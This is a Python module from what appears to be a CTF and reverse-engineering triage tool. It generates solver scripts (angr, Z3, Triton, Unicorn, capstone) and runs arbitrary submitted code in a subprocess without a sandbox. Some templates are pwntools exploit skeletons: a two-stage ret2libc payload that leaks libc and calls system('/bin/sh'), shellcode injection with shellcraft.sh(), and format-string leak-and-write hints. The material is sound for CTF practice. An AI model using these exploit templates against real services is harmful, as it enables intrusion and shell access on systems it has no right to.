"""Solver script generation and execution.

Each solver template generates a Python script string for a different
exploitation/reverse-engineering technique.
"""

import os
import sys
import logging
import tempfile
import subprocess

log = logging.getLogger('triage-web')

SOLVER_LIST = [
    {'id': 'angr_find_flag', 'name': 'angr — Find Flag'},
    {'id': 'triton_solve_flag', 'name': 'Triton — Concolic Flag Solve'},
    {'id': 'unicorn_emulate_func', 'name': 'Unicorn — Emulate Function'},
    {'id': 'z3_constraint_solve', 'name': 'Z3 — Constraint Solve'},
    {'id': 'static_string_reconstruct', 'name': 'Static — String Reconstruct'},
    {'id': 'overflow_exploit', 'name': 'pwn — ret2win / BOF'},
    {'id': 'ret2libc', 'name': 'pwn — ret2libc'},
    {'id': 'rop_execve_chain', 'name': 'pwn — ROP execve'},
    {'id': 'shellcode_exploit', 'name': 'pwn — Shellcode Injection'},
    {'id': 'format_string_exploit', 'name': 'pwn — Format String'},
]

SOLVER_TIMEOUT = 120  # seconds


def _common(path: str) -> str:
    """Preamble shared by every solver script."""
    return (
        f'import sys\n'
        f'import subprocess\n'
        f'BINARY = {repr(path)}\n\n'
    )


def _angr_find(path: str, bits: int, arch: str = '') -> str:
    return (
        f'{_common(path)}'
        f'import angr\n'
        f'import claripy\n\n'
        f'proj = angr.Project(BINARY, auto_load_libs=False)\n'
        f'state = proj.factory.entry_state()\n'
        f'simgr = proj.factory.simulation_manager(state)\n'
        f'simgr.explore(find=lambda s: b"flag" in s.posix.dumps(1) or b"Correct" in s.posix.dumps(1))\n'
        f'if simgr.found:\n'
        f'    print(simgr.found[0].posix.dumps(0))\n'
        f'else:\n'
        f'    print("No solution found")\n'
    )


def _z3_constraint(path: str, bits: int, arch: str = '') -> str:
    return (
        f'{_common(path)}'
        f'import z3\n\n'
        f'solver = z3.Solver()\n'
        f'flag_len = 32\n'
        f'flag = [z3.BitVec("f_" + str(i), 8) for i in range(flag_len)]\n'
        f'for c in flag:\n'
        f'    solver.add(c >= 0x20, c <= 0x7e)\n'
        f'if solver.check() == z3.sat:\n'
        f'    m = solver.model()\n'
        f'    print("".join(chr(m[f].as_long()) for f in flag))\n'
        f'else:\n'
        f'    print("unsat")\n'
    )


def _static_reconstruct(path: str, bits: int, arch: str) -> str:
    return (
        f'{_common(path)}'
        f'# Reconstruct strings from immediate-value writes in disassembly\n'
        f'from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32\n'
        f'mode = CS_MODE_64 if {bits} == 64 else CS_MODE_32\n'
        f'md = Cs(CS_ARCH_X86, mode)\n'
        f'with open(BINARY, "rb") as f:\n'
        f'    buf = f.read()\n'
        f'import re\n'
        f'writes = {{}}\n'
        f'for insn in md.disasm(buf, 0):\n'
        f'    if insn.mnemonic not in ("movabs", "mov", "movl", "movw", "movb"):\n'
        f'        continue\n'
        f'    # Intel syntax: "dest, src" — parts[0] = dest, parts[1] = src\n'
        f'    parts = insn.op_str.split(",")\n'
        f'    if len(parts) != 2:\n'
        f'        continue\n'
        f'    dst = parts[0].strip()\n'
        f'    imm_str = parts[1].strip().lstrip("$")\n'
        f'    if not imm_str.startswith("0x"):\n'
        f'        continue\n'
        f'    # Extract destination offset from [...] syntax\n'
        f'    m = re.search(r"\\[(.*?)(?:\\s*([+-])\\s*(0x[0-9a-fA-F]+|\\d+))?\\]", dst)\n'
        f'    if not m:\n'
        f'        continue\n'
        f'    try:\n'
        f'        reg_base = m.group(1)\n'
        f'        sign = m.group(2)\n'
        f'        off_str = m.group(3)\n'
        f'        dst_off = int(off_str, 16) if off_str and off_str.startswith("0x") else (int(off_str) if off_str else 0)\n'
        f'        if sign == "-":\n'
        f'            dst_off = -dst_off\n'
        f'        imm = int(imm_str, 16)\n'
        f'        sz = {{"movl": 4, "movabs": 8, "movw": 2, "movb": 1, "mov": 4, "movzx": 4, "movsx": 4}}.get(insn.mnemonic, 4)\n'
        f'        for i in range(sz):\n'
        f'            b = (imm >> (8 * i)) & 0xFF\n'
        f'            if b:\n'
        f'                writes[dst_off + i] = b\n'
        f'    except:\n'
        f'        pass\n'
        f'if writes:\n'
        f'    base = min(writes)\n'
        f'    end = max(writes) + 1\n'
        f'    flag = bytearray(end - base)\n'
        f'    for k, v in writes.items():\n'
        f'        flag[k - base] = v\n'
        f'    s = flag.decode("ascii", errors="replace")\n'
        f'    print("Reconstructed:", repr(s))\n'
        f'    # Filter to printable runs\n'
        f'    import string\n'
        f'    printable = "".join(c if c in string.printable and c != "\\n" else "." for c in s)\n'
        f'    print("Printable:", printable)\n'
        f'else:\n'
        f'    print("No string writes with [reg+offset] addressing found")\n'
    )


def _overflow_exploit(path: str, bits: int, arch: str) -> str:
    return (
        f'{_common(path)}'
        f'from pwn import *\n\n'
        f'elf = ELF(BINARY)\n'
        f'win = elf.symbols.get("win") or elf.symbols.get("flag") or 0\n'
        f'if win:\n'
        f'    print(f"win() @ 0x{{win:x}}")\n'
        f'else:\n'
        f'    print("No win/flag symbol found")\n'
    )


def _rop_execve(path: str, bits: int, arch: str) -> str:
    return (
        f'{_common(path)}'
        f'from pwn import *\n\n'
        f'elf = ELF(BINARY)\n'
        f'rop = ROP(elf)\n'
        f'try:\n'
        f'    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]\n'
        f'    print(f"pop rdi; ret @ 0x{{pop_rdi:x}}")\n'
        f'except:\n'
        f'    print("pop rdi gadget not found")\n'
    )


def _format_string(path: str, bits: int, arch: str) -> str:
    return (
        f'{_common(path)}'
        f'from pwn import *\n\n'
        f'elf = ELF(BINARY)\n'
        f'print("[*] Format string skeleton")\n'
        f'print("[*] Leak: %p.%p.%p.%p.%p.%p.%p.%p on first input")\n'
        f'print("[*] Then use %n or %hn to write GOT entries")\n'
    )


def _ret2libc(path: str, bits: int, arch: str) -> str:
    return (
        f'{_common(path)}'
        f'from pwn import *\n\n'
        f'elf = context.binary = ELF(BINARY, checksec=False)\n'
        f'libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)\n'
        f'# libc = ELF("./libc.so.6", checksec=False)  # use if provided\n'
        f'context.log_level = "info"\n\n'
        f'POP_RDI = 0x0  # TODO: search gadgets, e.g. rop.find_gadget(["pop rdi", "ret"])\n'
        f'RET     = 0x0\n'
        f'OFFSET  = 64  # TODO: cyclic_find\n\n'
        f'def conn():\n'
        f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
        f'def stage1_leak(io):\n'
        f'    payload  = b"A" * OFFSET\n'
        f'    payload += p64(POP_RDI)\n'
        f'    payload += p64(elf.got["puts"])\n'
        f'    payload += p64(elf.plt["puts"])\n'
        f'    payload += p64(elf.sym["main"])\n'
        f'    io.sendlineafter(b"> ", payload)\n'
        f'    leak = u64(io.recvline().strip().ljust(8, b"\\\\x00"))\n'
        f'    libc.address = leak - libc.sym["puts"]\n'
        f'    log.success(f"libc @ {{hex(libc.address)}}")\n\n'
        f'def stage2_shell(io):\n'
        f'    bin_sh  = next(libc.search(b"/bin/sh\\\\x00"))\n'
        f'    payload  = b"A" * OFFSET\n'
        f'    payload += p64(RET)\n'
        f'    payload += p64(POP_RDI) + p64(bin_sh)\n'
        f'    payload += p64(libc.sym["system"])\n'
        f'    io.sendlineafter(b"> ", payload)\n\n'
        f'def exploit():\n'
        f'    io = conn()\n'
        f'    stage1_leak(io)\n'
        f'    stage2_shell(io)\n'
        f'    io.interactive()\n\n'
        f'exploit()\n'
    )


def _shellcode_exploit(path: str, bits: int, arch: str) -> str:
    return (
        f'{_common(path)}'
        f'from pwn import *\n\n'
        f'elf = context.binary = ELF(BINARY, checksec=False)\n'
        f'context.arch  = "{arch.lower().replace("_64","")}"\n'
        f'context.bits  = {bits}\n'
        f'context.log_level = "info"\n\n'
        f'sc = asm(shellcraft.sh())\n'
        f'log.info(f"shellcode {{len(sc)}} bytes")\n'
        f'OFFSET = 64  # TODO: cyclic_find\n\n'
        f'def conn():\n'
        f'    return remote("target", 1337) if args.REMOTE else process(elf.path)\n\n'
        f'def exploit():\n'
        f'    io = conn()\n'
        f'    io.recvuntil(b"> ", timeout=2)\n'
        f'    nop  = b"\\\\x90" * max(0, OFFSET - len(sc))\n'
        f'    payload = nop + sc + b"A" * max(0, OFFSET - len(nop) - len(sc))\n'
        f'    payload += p64(0xdeadbeef)  # TODO: replace with leaked buf addr\n'
        f'    io.sendline(payload)\n'
        f'    io.interactive()\n\n'
        f'exploit()\n'
    )


def _triton_solve_flag(path: str, bits: int, arch: str) -> str:
    """Concolic solve: emulate the checker one instruction at a time with a
    symbolic input buffer, then ask the SMT backend for input that keeps every
    taken branch on the 'good' path. No process is spawned — pure emulation."""
    return (
        f'{_common(path)}'
        f'from triton import TritonContext, ARCH, Instruction, MemoryAccess, MODE\n'
        f'import lief\n\n'
        f'# ── config — fill these in from the Disasm/Decompile tab ──\n'
        f'CHECK_ADDR   = 0x0            # address of the function that validates input\n'
        f'INPUT_ADDR   = 0x404000      # a writable buffer the function reads its input from\n'
        f'INPUT_LEN    = 32            # guessed flag length\n'
        f'SUCCESS_ADDR = 0x0           # an address only reached on "Correct!" (e.g. the puts call)\n'
        f'FAIL_ADDR    = 0x0           # an address only reached on failure (optional)\n\n'
        f'ctx = TritonContext(ARCH.X86_64 if {bits} == 64 else ARCH.X86)\n'
        f'ctx.setMode(MODE.ALIGNED_MEMORY, True)\n'
        f'ctx.setMode(MODE.CONSTANT_FOLDING, True)\n\n'
        f'# map the binary image so call targets / rodata resolve\n'
        f'bin_ = lief.parse(BINARY)\n'
        f'for seg in getattr(bin_, "segments", []):\n'
        f'    if int(seg.virtual_size) and list(seg.content):\n'
        f'        ctx.setConcreteMemoryAreaValue(int(seg.virtual_address), bytes(seg.content))\n\n'
        f'sp = 0x7fffff00\n'
        f'ctx.setConcreteRegisterValue(ctx.registers.rsp if {bits}==64 else ctx.registers.esp, sp)\n'
        f'ctx.setConcreteRegisterValue(ctx.registers.rbp if {bits}==64 else ctx.registers.ebp, sp)\n\n'
        f'# symbolise the input buffer\n'
        f'for i in range(INPUT_LEN):\n'
        f'    ctx.setConcreteMemoryValue(MemoryAccess(INPUT_ADDR + i, 1), 0x41)\n'
        f'    ctx.symbolizeMemory(MemoryAccess(INPUT_ADDR + i, 1), f"flag_{{i}}")\n\n'
        f'# common calling convention: first arg -> rdi/[esp+4] points at the buffer\n'
        f'if {bits} == 64:\n'
        f'    ctx.setConcreteRegisterValue(ctx.registers.rdi, INPUT_ADDR)\n'
        f'else:\n'
        f'    ctx.setConcreteMemoryValue(MemoryAccess(sp + 4, 4), INPUT_ADDR)\n\n'
        f'pc = CHECK_ADDR\n'
        f'assert pc, "set CHECK_ADDR first"\n'
        f'ctx.setConcreteRegisterValue(ctx.registers.rip if {bits}==64 else ctx.registers.eip, pc)\n\n'
        f'for _ in range(200000):\n'
        f'    opc = ctx.getConcreteMemoryAreaValue(pc, 16)\n'
        f'    inst = Instruction(pc, opc)\n'
        f'    ctx.processing(inst)\n'
        f'    pc = ctx.getConcreteRegisterValue(ctx.registers.rip if {bits}==64 else ctx.registers.eip)\n'
        f'    if SUCCESS_ADDR and pc == SUCCESS_ADDR:\n'
        f'        break\n'
        f'    if FAIL_ADDR and pc == FAIL_ADDR:\n'
        f'        print("hit FAIL_ADDR before SUCCESS — the concrete path is wrong."); \\\n'
        f'        print("Flip the offending branch: negate its predicate in `cond` below."); break\n'
        f'    if pc == 0:\n'
        f'        break\n\n'
        f'# conjunction of every branch actually taken -> ask for an input model\n'
        f'cond  = ctx.getPathPredicate()\n'
        f'model = ctx.getModel(cond)\n'
        f'out = bytearray(INPUT_LEN)\n'
        f'for sym_id, sm in model.items():\n'
        f'    alias = ctx.getSymbolicVariable(sym_id).getAlias()   # "flag_<i>"\n'
        f'    out[int(alias.split("_")[1])] = sm.getValue() & 0xff\n'
        f'print("candidate input:", bytes(out))\n'
    )


def _unicorn_emulate_func(path: str, bits: int, arch: str) -> str:
    """Concretely emulate one function (e.g. a decrypt / deobfuscation routine)
    with controlled arguments and dump its return value + an output region."""
    return (
        f'{_common(path)}'
        f'from unicorn import *\n'
        f'from unicorn.x86_const import *\n'
        f'import lief\n\n'
        f'FUNC_ADDR = 0x0        # function to run (from the Functions tab)\n'
        f'ARG1 = 0x600000        # e.g. pointer to an input/output buffer you allocate below\n'
        f'ARG2 = 0               # second arg (length, key, ...)\n'
        f'OUT_ADDR, OUT_LEN = ARG1, 64\n\n'
        f'BITS = {bits}\n'
        f'uc = Uc(UC_ARCH_X86, UC_MODE_64 if BITS == 64 else UC_MODE_32)\n\n'
        f'bin_ = lief.parse(BINARY)\n'
        f'PAGE = 0x1000\n'
        f'def mapseg(base, data):\n'
        f'    a = base & ~(PAGE-1); sz = ((len(data) + (base - a) + PAGE) // PAGE) * PAGE\n'
        f'    try: uc.mem_map(a, sz)\n'
        f'    except UcError: pass\n'
        f'    uc.mem_write(base, bytes(data))\n'
        f'for seg in getattr(bin_, "segments", []):\n'
        f'    if list(seg.content):\n'
        f'        mapseg(int(seg.virtual_address), bytes(seg.content))\n\n'
        f'STACK = 0x7f000000; uc.mem_map(STACK - 0x100000, 0x200000)\n'
        f'sp = STACK\n'
        f'uc.mem_map(0x600000, 0x10000)              # scratch buffer region\n'
        f'uc.mem_write(ARG1, b"INPUT-GOES-HERE\\x00")   # TODO: real input bytes\n\n'
        f'RET_MAGIC = 0x1337000\n'
        f'if BITS == 64:\n'
        f'    uc.reg_write(UC_X86_REG_RSP, sp); uc.reg_write(UC_X86_REG_RBP, sp)\n'
        f'    uc.reg_write(UC_X86_REG_RDI, ARG1); uc.reg_write(UC_X86_REG_RSI, ARG2)\n'
        f'    uc.mem_write(sp, RET_MAGIC.to_bytes(8, "little"))\n'
        f'else:\n'
        f'    uc.reg_write(UC_X86_REG_ESP, sp); uc.reg_write(UC_X86_REG_EBP, sp)\n'
        f'    uc.mem_write(sp, RET_MAGIC.to_bytes(4, "little"))\n'
        f'    uc.mem_write(sp + 4, ARG1.to_bytes(4, "little"))\n'
        f'    uc.mem_write(sp + 8, ARG2.to_bytes(4, "little"))\n\n'
        f'try:\n'
        f'    uc.emu_start(FUNC_ADDR, RET_MAGIC)\n'
        f'except UcError as e:\n'
        f'    print("emulation stopped:", e)\n\n'
        f'rv = uc.reg_read(UC_X86_REG_RAX if BITS == 64 else UC_X86_REG_EAX)\n'
        f'print("return value:", hex(rv))\n'
        f'print("output region:", uc.mem_read(OUT_ADDR, OUT_LEN))\n'
    )


# Map solver type → generator function
SOLVER_GENERATORS = {
    'angr_find_flag': _angr_find,
    'triton_solve_flag': _triton_solve_flag,
    'unicorn_emulate_func': _unicorn_emulate_func,
    'z3_constraint_solve': _z3_constraint,
    'static_string_reconstruct': _static_reconstruct,
    'overflow_exploit': _overflow_exploit,
    'rop_execve_chain': _rop_execve,
    'format_string_exploit': _format_string,
    'ret2libc': _ret2libc,
    'shellcode_exploit': _shellcode_exploit,
}


def generate_solver(solver_type: str, path: str, arch: str, bits: int) -> str:
    """Generate solver script source code for the given type."""
    gen = SOLVER_GENERATORS.get(solver_type)
    if gen is None:
        raise ValueError(f'Unknown solver type: {solver_type}')
    return gen(path, bits, arch)


def get_solver_list() -> list:
    """Return the list of available solver types."""
    return SOLVER_LIST


def execute_solver(code: str) -> dict:
    """Write solver code to a temp file and execute it in a subprocess.

    Returns dict with stdout, stderr, returncode.
    """
    if not code.strip():
        return {'stdout': '', 'stderr': 'No code provided', 'returncode': -1}

    tmp = None
    try:
        tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False,
                                          encoding='utf-8')
        tmp.write(code)
        tmp.close()
        r = subprocess.run(
            [sys.executable, tmp.name],
            capture_output=True, text=True, timeout=SOLVER_TIMEOUT,
        )
        return {
            'stdout': r.stdout,
            'stderr': r.stderr,
            'returncode': r.returncode,
        }
    except subprocess.TimeoutExpired:
        return {
            'stdout': '',
            'stderr': f'Execution timed out after {SOLVER_TIMEOUT} seconds',
            'returncode': -1,
        }
    except Exception as e:
        return {'stdout': '', 'stderr': str(e), 'returncode': -1}
    finally:
        if tmp and os.path.exists(tmp.name):
            try:
                os.unlink(tmp.name)
            except OSError:
                pass
